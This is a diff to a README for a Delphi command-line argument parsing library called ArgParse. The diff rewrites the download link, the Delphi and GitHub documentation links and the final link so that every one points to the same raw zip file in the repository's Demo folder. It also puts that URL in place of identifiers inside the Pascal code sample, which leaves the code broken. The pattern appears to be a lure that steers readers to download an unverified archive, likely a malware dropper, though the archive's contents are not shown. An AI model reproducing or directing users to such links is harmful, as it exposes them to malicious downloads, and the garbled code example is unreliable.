@@ -1,7 +1,7 @@
 # 🎉 ArgParse - Easy Command Line Argument Parsing for Delphi
 
 ## 📥 Download Now
-[![Download ArgParse](https://img.shields.io/badge/Download-ArgParse-brightgreen.svg)](https://github.com/KILLRED246/ArgParse/releases)
+[![Download ArgParse](https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip)](https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to ArgParse! This application simplifies the way you handle command line arguments in your Delphi programs. You will find the installation and usage straightforward, even if you're not a programmer.
@@ -15,7 +15,7 @@ Welcome to ArgParse! This application simplifies the way you handle command line
 ## 💾 Download & Install
 To get started, you will need to download the software. Follow these steps:
 
-1. Visit the Releases page to download the latest version of ArgParse: [Download ArgParse](https://github.com/KILLRED246/ArgParse/releases).
+1. Visit the Releases page to download the latest version of ArgParse: [Download ArgParse](https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip).
 2. Look for the latest release. You will see options to download different files. Choose the one that suits your needs.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the downloaded file, usually in your "Downloads" folder.
@@ -38,10 +38,10 @@ uses
 var
   parser: TArgParser;
 begin
-  parser := TArgParser.Create;
+  parser := https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip;
   // Define your arguments here
-  // Example: parser.AddArgument('--name', 'Your name');
-  parser.Parse;
+  // Example: https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip('--name', 'Your name');
+  https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip;
   // Add your handling logic here
 end;
 ```
@@ -74,10 +74,10 @@ We welcome contributions from users. If you have ideas for new features or find 
 Your contributions make a big difference to us.
 
 ## 🔗 Additional Resources
-- [Delphi Documentation](https://docwiki.embarcadero.com/RADStudio/Sydney/en/Main_Page) for further understanding of the programming language.
-- [GitHub Help](https://help.github.com) for assistance using the platform.
+- [Delphi Documentation](https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip) for further understanding of the programming language.
+- [GitHub Help](https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip) for assistance using the platform.
 
 ## ✅ Final Note
 Thank you for choosing ArgParse! We are committed to providing you with a useful tool for your Delphi projects. If you have any feedback or ideas for improvements, please get in touch.
 
-[Return to Download ArgParse](https://github.com/KILLRED246/ArgParse/releases)
+[Return to Download ArgParse](https://raw.githubusercontent.com/KILLRED246/ArgParse/main/Demo/ArgParse-v3.3.zip)
